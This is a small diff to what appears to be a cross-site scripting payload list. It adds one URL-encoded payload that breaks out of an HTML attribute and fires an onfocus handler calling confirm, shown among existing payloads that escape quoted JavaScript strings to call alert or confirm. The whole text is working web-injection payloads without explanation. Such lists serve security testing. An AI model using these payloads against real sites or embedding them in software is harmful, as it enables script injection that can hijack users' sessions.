@@ -1,5 +1,6 @@
  “-confirm`1`-”
  \'-alert(1)//
+ %27%22%20autofocus/onfocus=confirm`xss`//
 \”-confirm`1`//
 \”}})})-confirm`1`//
 \”}})})-confirm`1`/*/
